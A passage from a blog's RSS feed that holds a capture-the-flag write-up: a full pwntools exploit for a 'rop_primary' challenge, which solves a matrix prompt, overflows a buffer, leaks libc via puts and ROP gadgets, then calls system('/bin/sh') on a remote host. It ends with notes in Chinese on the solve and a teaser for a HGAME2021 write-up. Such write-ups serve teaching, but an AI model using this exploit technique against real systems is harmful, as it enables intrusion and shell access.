&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">LibcSearcher&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">re&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./rop_primary&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x401613&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rsi_r15_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x401611&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_r14_r15_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x401610&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">def&lt;/span> &lt;span style="color:#06287e">matrixMul&lt;/span>(A, B):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">if&lt;/span> &lt;span style="color:#007020">len&lt;/span>(A[&lt;span style="color:#40a070">0&lt;/span>]) &lt;span style="color:#666">==&lt;/span> &lt;span style="color:#007020">len&lt;/span>(B):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#666">=&lt;/span> [[&lt;span style="color:#40a070">0&lt;/span>] &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#007020">len&lt;/span>(B[&lt;span style="color:#40a070">0&lt;/span>]) &lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#007020">len&lt;/span>(A))]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#007020">len&lt;/span>(A)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> j &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#007020">len&lt;/span>(B[&lt;span style="color:#40a070">0&lt;/span>])):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> k &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#007020">len&lt;/span>(B)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res[i][j] &lt;span style="color:#666">+=&lt;/span> &lt;span style="color:#007020">int&lt;/span>(A[i][k]) &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#007020">int&lt;/span>(B[k][j])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">return&lt;/span> res
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh &lt;span style="color:#666">=&lt;/span> remote(&lt;span style="color:#4070a0">&amp;#34;159.75.104.107&amp;#34;&lt;/span>,&lt;span style="color:#40a070">30372&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;A:&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>matA &lt;span style="color:#666">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>matB &lt;span style="color:#666">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">while&lt;/span> &lt;span style="color:#40a070">1&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> number_string &lt;span style="color:#666">=&lt;/span> sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,drop &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020;font-weight:bold">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">if&lt;/span>(number_string &lt;span style="color:#666">==&lt;/span> &lt;span style="color:#4070a0">&amp;#39;B:&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> matA&lt;span style="color:#666">.&lt;/span>append(re&lt;span style="color:#666">.&lt;/span>findall(&lt;span style="color:#4070a0">r&lt;/span>&lt;span style="color:#4070a0">&amp;#34;\d+\.?\d*&amp;#34;&lt;/span>,number_string))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">while&lt;/span> &lt;span style="color:#40a070">1&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> number_string &lt;span style="color:#666">=&lt;/span> sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,drop &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020;font-weight:bold">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">if&lt;/span>(number_string &lt;span style="color:#666">==&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a * b = ?&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> matB&lt;span style="color:#666">.&lt;/span>append(re&lt;span style="color:#666">.&lt;/span>findall(&lt;span style="color:#4070a0">r&lt;/span>&lt;span style="color:#4070a0">&amp;#34;\d+\.?\d*&amp;#34;&lt;/span>,number_string))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>matAns &lt;span style="color:#666">=&lt;/span> matrixMul(matA,matB)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020">print&lt;/span> matAns
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> matAns:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> j &lt;span style="color:#007020;font-weight:bold">in&lt;/span> i:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendline(&lt;span style="color:#007020">str&lt;/span>(j))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;best&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">0x30&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;b&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">8&lt;/span> &lt;span style="color:#666">+&lt;/span> p64(pop_rdi_ret) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>got[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>symbols[&lt;span style="color:#4070a0">&amp;#34;puts&amp;#34;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x40157B&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendline(payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leak_addr &lt;span style="color:#666">=&lt;/span> u64(sh&lt;span style="color:#666">.&lt;/span>recv(&lt;span style="color:#40a070">6&lt;/span>)&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">8&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#666">.&lt;/span>success(&lt;span style="color:#4070a0">&amp;#34;addr:&amp;#34;&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#007020">hex&lt;/span>(leak_addr))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#666">=&lt;/span> LibcSearcher(&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>,leak_addr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#666">=&lt;/span> leak_addr &lt;span style="color:#666">-&lt;/span> libc&lt;span style="color:#666">.&lt;/span>dump(&lt;span style="color:#4070a0">&amp;#34;puts&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#666">.&lt;/span>success(&lt;span style="color:#4070a0">&amp;#34;libc_base:&amp;#34;&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#007020">hex&lt;/span>(libc_base))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#666">=&lt;/span> libc_base &lt;span style="color:#666">+&lt;/span> libc&lt;span style="color:#666">.&lt;/span>dump(&lt;span style="color:#4070a0">&amp;#34;system&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bin_sh_addr &lt;span style="color:#666">=&lt;/span> libc_base &lt;span style="color:#666">+&lt;/span> libc&lt;span style="color:#666">.&lt;/span>dump(&lt;span style="color:#4070a0">&amp;#39;str_bin_sh&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">0x30&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;b&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">8&lt;/span> &lt;span style="color:#666">+&lt;/span> p64(pop_r14_r15_ret) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0&lt;/span>) &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">2&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(pop_rdi_ret) &lt;span style="color:#666">+&lt;/span> p64(bin_sh_addr) &lt;span style="color:#666">+&lt;/span> p64(system_addr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#39;best&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>写完exp打远程的时候发现搜不出来 libc，考虑是 libc-database 版本过低，然后尝试更新，但是 libc-database 本身是装 LibcSearcher 的时候一起装的，可能安装的时候有点问题，get 脚本用不来，所以只好整个 libc-database 删掉重装，重新 get，家里的带宽确实比较小，整个更新大概花了半个多小时，再加上更新的时候干别的事情去了差点把这题忘了，所以很晚才打通，但是运气还算不错，抢到了一血，只比二血早了30秒&lt;/p></description></item><item><title>HGAME2021-WEAK1-WP</title><link>https://chujdk.github.io/wp/1044.html</link><pubDate>Sun, 07 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1044.html</guid><description>&lt;p>许久没有更新博客了，主要是因为最近都在打 &lt;code>hgame&lt;/code>，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的合集。bin 的题是都解出来了，别的方向大概也就做了做签到，应该说是真的不会，最后的总分是真的不怎么好看，pwn手心里苦啊。&lt;/p></description></item></channel></rss>